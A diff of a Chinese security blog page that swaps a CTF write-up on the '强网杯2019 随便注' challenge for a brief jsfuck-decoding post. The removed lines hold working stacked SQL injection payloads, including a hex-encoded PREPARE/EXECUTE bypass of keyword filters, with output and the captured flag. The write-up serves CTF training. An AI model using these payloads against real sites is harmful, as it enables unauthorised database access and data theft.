@@ -7,21 +7,20 @@
 <meta name="full-screen" content="yes">
 <meta name="theme-color" content="#317EFB" />
 <meta content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=0" name="viewport">
-<meta name="description" content="2019强网杯-随便注 前提： 目标存在SQL注入漏洞 目标未对”;”号进行过滤 目标中间层查询数据库信息时可同时执行多条SQL语句  支持堆叠数据库：MYSQL MSSQL Postgresql等 解题思路 先查看所有数据库，得到ctftraining和supersqli两个关键数据库 123456789&#x27;; SHOW DATABASES;--+array(1) &#123;   [0">
+<meta name="description" content="学逆向-jsfuck    解题思路 查看网页源代码有jsfuck解密 打开jsfuck.com网站，输入在源代码看到的jsfuck密文，解密 换成全部大写输入">
 <meta property="og:type" content="article">
-<meta property="og:title" content="BUFFCTF [强网杯2019]随便注">
-<meta property="og:url" content="https://cyphersun.github.io/2024/03/21/CTF-BUFFCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/index.html">
+<meta property="og:title" content="CTF-jsfuck">
+<meta property="og:url" content="https://cyphersun.github.io/2024/09/12/CTF-jsfuck/index.html">
 <meta property="og:site_name" content="CypherSun">
-<meta property="og:description" content="2019强网杯-随便注 前提： 目标存在SQL注入漏洞 目标未对”;”号进行过滤 目标中间层查询数据库信息时可同时执行多条SQL语句  支持堆叠数据库：MYSQL MSSQL Postgresql等 解题思路 先查看所有数据库，得到ctftraining和supersqli两个关键数据库 123456789&#x27;; SHOW DATABASES;--+array(1) &#123;   [0">
+<meta property="og:description" content="学逆向-jsfuck    解题思路 查看网页源代码有jsfuck解密 打开jsfuck.com网站，输入在源代码看到的jsfuck密文，解密 换成全部大写输入">
 <meta property="og:locale">
-<meta property="article:published_time" content="2024-03-21T04:38:03.000Z">
-<meta property="article:modified_time" content="2024-03-22T03:19:44.000Z">
+<meta property="article:published_time" content="2024-09-12T17:00:19.000Z">
+<meta property="article:modified_time" content="2024-09-12T17:04:13.468Z">
 <meta property="article:author" content="CypherSun">
-<meta property="article:tag" content="SQL堆叠注入">
 <meta name="twitter:card" content="summary">
 
 
-<title >BUFFCTF [强网杯2019]随便注</title>
+<title >CTF-jsfuck</title>
 
 <!-- Favicon -->
 
@@ -58,7 +57,7 @@
 
 <!-- Variable -->
 <script>window.ASYNC_CONFIG = {"hostname":"cyphersun.github.io","author":"CypherSun","root":"/","typed_text":["a cybersecurity engineer"],"theme_version":"2.2.3","theme":{"switch":true,"default":"style-light"},"favicon":{"logo":null,"icon16":null,"icon32":"favicon.ico","apple_touch_icon":null,"webmanifest":null,"visibilitychange":true,"hidden":"favicon.ico","show_text":"(/≧▽≦/)咦！又好了！","hide_text":"(●—●)喔哟，崩溃啦！","appleTouchIcon":null,"showText":"骗你的~ (￣▽￣)ノ","hideText":"崩溃啦！(╯‵□′)╯︵┻━┻"},"i18n":{"placeholder":"搜索文章...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）","author":"本文作者：","copyright_link":"本文链接：","copyright_license_title":"版权声明：","copyright_license_content":"本博客所有文章除特别声明外，均默认采用 undefined 许可协议。","copy_success":"复制成功","copy_failure":"复制失败","open_read_mode":"进入阅读模式","exit_read_mode":"退出阅读模式","notice_outdate_message":"距离上次更新已经 undefined 天了, 文章内容可能已经过时。","sticky":"置顶","just":"刚刚","min":"分钟前","hour":"小时前","day":"天前","month":"个月前"},"swup":true,"plugin":{"flickr_justified_gallery":"https://unpkg.com/flickr-justified-gallery@latest/dist/fjGallery.min.js"},"icons":{"sun":"far fa-sun","moon":"far fa-moon","play":"fas fa-play","email":"far fa-envelope","next":"fas fa-arrow-right","calendar":"far fa-calendar-alt","clock":"far fa-clock","user":"far fa-user","back_top":"fas fa-arrow-up","close":"fas fa-times","search":"fas fa-search","reward":"fas fa-hand-holding-usd","toc_tag":"fas fa-th-list","read":"fas fa-book-reader","arrows":"fas fa-arrows-alt-h","double_arrows":"fas fa-angle-double-down","copy":"fas fa-copy","user_tag":"fas fa-user-alt"},"icontype":"font","highlight":{"plugin":"highlighjs","theme":true,"copy":true,"lang":true,"title":"default","height_limit":"200px"},"toc":{"post_title":true},"live_time":{"start_time":"03/09/2024 15:46:00","prefix":"博客已萌萌哒运行 undefined 天"},"danmu":{"enable":false,"el":".trm-banner"},"search":{"enable":true,"type":"local","href":"https://www.google.com/search?q=site:","domain":null,"path":"search.xml"}};</script>
-<script id="async-page-config">window.PAGE_CONFIG = {"isPost":true,"isHome":false,"postUpdate":"2024-03-22 04:19:44"};</script>
+<script id="async-page-config">window.PAGE_CONFIG = {"isPost":true,"isHome":false,"postUpdate":"2024-09-12 19:04:13"};</script>
 
 <!-- Theme mode css -->
 <link data-swup-theme rel="stylesheet" href="/css/index.css?v=2.2.3" id="trm-switch-style">
@@ -228,7 +227,7 @@
                             NEWS LETTER
                         </div>
                         <h1 class="trm-mb-30 trm-hsmb-font">
-                            BUFFCTF [强网杯2019]随便注
+                            CTF-jsfuck
                         </h1>
 
                         
@@ -361,13 +360,13 @@
     <div class="col-sm-4">
         <div class="trm-card trm-label trm-label-light text-center">
             <i class="iconfont far fa-calendar-alt trm-icon"></i><br>
-            03/21
+            09/12
         </div>
     </div>
     <div class="col-sm-4">
         <div class="trm-card trm-label trm-label-light text-center">
             <i class="iconfont far fa-clock trm-icon"></i><br>
-            05:38
+            19:00
         </div>
     </div>
     <div class="col-sm-4">
@@ -379,66 +378,15 @@
 </div>
 <div class="trm-card ">
     <article id="article-container" class="trm-publication">
-    <p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8">2019强网杯-随便注</a><br><br></p>
-<h2 id="前提："><a href="#前提：" class="headerlink" title="前提："></a>前提：</h2><ol>
-<li>目标存在SQL注入漏洞</li>
-<li>目标未对”;”号进行过滤</li>
-<li>目标中间层查询数据库信息时可同时执行多条SQL语句</li>
-</ol>
-<p>支持堆叠数据库：MYSQL MSSQL Postgresql等<br><br></p>
+    <p><a target="_blank" rel="noopener" href="https://www.xuenixiang.com/ctfexercise-competition-284.html">学逆向-jsfuck</a></p>
+<br>
+
+
 <h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><ol>
-<li><p>先查看所有数据库，得到ctftraining和supersqli两个关键数据库</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;; SHOW DATABASES;--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">array(1) &#123;   [0]=&gt;   string(11) &quot;ctftraining&quot; &#125;</span></span><br><span class="line"><span class="string">array(1) &#123;   [0]=&gt;   string(18) &quot;information_schema&quot; &#125;</span></span><br><span class="line"><span class="string">array(1) &#123;   [0]=&gt;   string(5) &quot;mysql&quot; &#125;</span></span><br><span class="line"><span class="string">array(1) &#123;   [0]=&gt;   string(18) &quot;performance_schema&quot; &#125;</span></span><br><span class="line"><span class="string">array(1) &#123;   [0]=&gt;   string(9) &quot;supersqli&quot; &#125;</span></span><br><span class="line"><span class="string">array(1) &#123;   [0]=&gt;   string(4) &quot;test&quot; &#125;</span></span><br></pre></td></tr></table></figure>
-<br>
-
-</li>
-<li><p>查看ctftraining的数据库，知道了FLAG_TABLE的表</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;; SHOW TABLES FROM ctftraining; --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">array(1) &#123;   [0]=&gt;   string(10) &quot;FLAG_TABLE&quot; &#125;</span></span><br><span class="line"><span class="string">array(1) &#123;   [0]=&gt;   string(4) &quot;news&quot; &#125;</span></span><br><span class="line"><span class="string">array(1) &#123;   [0]=&gt;   string(5) &quot;users&quot; &#125;</span></span><br></pre></td></tr></table></figure>
-<br>
-
-</li>
-<li><p>知道了FLAG_TABLE表名以后查看下面的列，“.”被过滤了换种方式</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;; SHOW COLUMNS FROM ctftraining.FLAG_TABLE; --+</span></span><br><span class="line"><span class="string">&#x27;</span>; SHOW COLUMNS FROM FLAG_TABLE IN ctftraining; --+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">array(6) &#123;   [0]=&gt;   string(11) <span class="string">&quot;FLAG_COLUMN&quot;</span>   [1]=&gt;   string(12) <span class="string">&quot;varchar(128)&quot;</span>   [2]=&gt;   string(2) <span class="string">&quot;NO&quot;</span>   [3]=&gt;   string(0) <span class="string">&quot;&quot;</span>   [4]=&gt;   string(8) <span class="string">&quot;not_flag&quot;</span>   [5]=&gt;   string(0) <span class="string">&quot;&quot;</span> &#125;</span><br></pre></td></tr></table></figure>
-<br>
-
-</li>
-<li><p>得到了FLAG_COLUMN，“.”和SELECT被过滤了换种方式，再换种方式</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;; SELECT FLAG_COLUMN FROM ctftraining.FLAG_TABLE; --+</span></span><br></pre></td></tr></table></figure></li>
+<li>查看网页源代码有jsfuck解密</li>
+<li>打开jsfuck.com网站，输入在源代码看到的jsfuck密文，解密</li>
+<li>换成全部大写输入</li>
 </ol>
-<br>
-
-<ol start="5">
-<li>把SELECT FLAG_COLUMN FROM ctftraining.FLAG_TABLE赋值给@a ，然后把注入语句转换为16进制，记得前面加上0x，让数据库识别为16进制，结果查询为空，被骗了，返回原来的supersqli<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;;SeT @a=0x53454c45435420464c41475f434f4c554d4e2046524f4d20637466747261696e696e672e464c41475f5441424c45;prepare execsql from @a;execute execsql;</span></span><br></pre></td></tr></table></figure></li>
-</ol>
-<br>
-<br>
-
-<ol start="6">
-<li><p>回到之前的知道的另一个数据库那里查看supersqli，知道了下面1919810931114514的表</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;; SHOW TABLES FROM supersqli; --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">array(1) &#123;   [0]=&gt;   string(16) &quot;1919810931114514&quot; &#125;</span></span><br><span class="line"><span class="string">array(1) &#123;   [0]=&gt;   string(5) &quot;words&quot; &#125;</span></span><br></pre></td></tr></table></figure>
-<br>
-<br>
-
-
-</li>
-<li><p>纯数字的表名需要反引号来圈起来，得到了一个flag的列</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;; SHOW COLUMNS FROM `1919810931114514` IN supersqli; --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">array(6) &#123;   [0]=&gt;   string(4) &quot;flag&quot;   [1]=&gt;   string(12) &quot;varchar(100)&quot;   [2]=&gt;   string(2) &quot;NO&quot;   [3]=&gt;   string(0) &quot;&quot;   [4]=&gt;   NULL   [5]=&gt;   string(0) &quot;&quot; &#125;</span></span><br></pre></td></tr></table></figure>
-<br>
-<br>
-</li>
-<li><p>“.”和SELECT被过滤了，换16进制方式</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;; SELECT flag FROM supersqli.`1919810931114514`; --+</span></span><br></pre></td></tr></table></figure></li>
-</ol>
-<br>
-<br>
-
-<ol start="9">
-<li>把SELECT flag FROM 1919810931114514 IN supersqli赋值给@a ，然后把注入语句转换为16进制，记得前面加上0x，让数据库识别为16进制，但是这种语句只能在堆叠注入种使用，需要完整的SQL语句<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;;SeT @a=0x53454c45435420666c61672046524f4d20737570657273716c692e603139313938313039333131313435313460;prepare execsql from @a;execute execsql;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">flag&#123;7edc6dee-c534-436a-861f-ed5fb3c98f3b&#125;</span></span><br></pre></td></tr></table></figure></li>
-</ol>
-<br>
-<br>
-
-<p>总结反思，看了网上的解题思路，他们在 SHOW DATABASES后再次 SHOW TABLE，是更快的解题思路，这次没有注意，已经总结，还有小细节需要再次总结</p>
 
 </article>
     
@@ -456,31 +404,31 @@
     
         <div class="col-lg-6">
     <div class="trm-blog-card trm-scroll-animation">
-        <a href="/2024/03/22/Web%E6%94%BB%E9%98%B26/" class="trm-cover-frame trm-anima-link">
+        <a href="/2024/09/15/CTF-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86/" class="trm-cover-frame trm-anima-link">
             
             
                 <div class="trm-cover-date">
-                    <div class="trm-cover-day">22</div>
-                    <div class="trm-cover-month">2024/03</div>
+                    <div class="trm-cover-day">15</div>
+                    <div class="trm-cover-month">2024/09</div>
                 </div>
             
         </a>
         
         <div class="trm-card-descr">
             <div class="trm-label trm-category trm-mb-20">
-                <a href=" /categories/Web%E6%94%BB%E9%98%B2/">
-                    Web攻防
+                <a href=" #.">
+                    未分类
                 </a>
             </div>
             <h5>
-                <a href="/2024/03/22/Web%E6%94%BB%E9%98%B26/" class="trm-anima-link">
-                    注入工具&amp;SQLMAP&amp;Tamper编写&amp;指纹修改&amp;高权限操作&amp;目录架构
+                <a href="/2024/09/15/CTF-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86/" class="trm-anima-link">
+                    CTF-SQL注入漏洞测试(参数加密)
                 </a>
             </h5>
             <div class="trm-divider trm-mb-20 trm-mt-20"></div>
             <ul class="trm-card-data trm-label">
-                <li>24/03/22</li>
-                <li>05:21</li>
+                <li>24/09/15</li>
+                <li>13:45</li>
                 
                 
             </ul>
@@ -491,31 +439,31 @@
     
         <div class="col-lg-6">
     <div class="trm-blog-card trm-scroll-animation">
-        <a href="/2024/03/21/Web%E6%94%BB%E9%98%B25/" class="trm-cover-frame trm-anima-link">
+        <a href="/2024/09/05/%E8%BD%AF%E4%BB%B6VMware%E5%AE%89%E8%A3%85/" class="trm-cover-frame trm-anima-link">
             
             
                 <div class="trm-cover-date">
-                    <div class="trm-cover-day">21</div>
-                    <div class="trm-cover-month">2024/03</div>
+                    <div class="trm-cover-day">05</div>
+                    <div class="trm-cover-month">2024/09</div>
                 </div>
             
         </a>
         
         <div class="trm-card-descr">
             <div class="trm-label trm-category trm-mb-20">
-                <a href=" /categories/Web%E6%94%BB%E9%98%B2/">
-                    Web攻防
+                <a href=" #.">
+                    未分类
                 </a>
             </div>
             <h5>
-                <a href="/2024/03/21/Web%E6%94%BB%E9%98%B25/" class="trm-anima-link">
-                    PHP应用&amp;SQL二次注入&amp;堆叠执行&amp;DNS带外&amp;功能点&amp;黑白盒条件
+                <a href="/2024/09/05/%E8%BD%AF%E4%BB%B6VMware%E5%AE%89%E8%A3%85/" class="trm-anima-link">
+                    VMware安装Win10
                 </a>
             </h5>
             <div class="trm-divider trm-mb-20 trm-mt-20"></div>
             <ul class="trm-card-data trm-label">
-                <li>24/03/21</li>
-                <li>05:14</li>
+                <li>24/09/05</li>
+                <li>17:52</li>
                 
                 
             </ul>
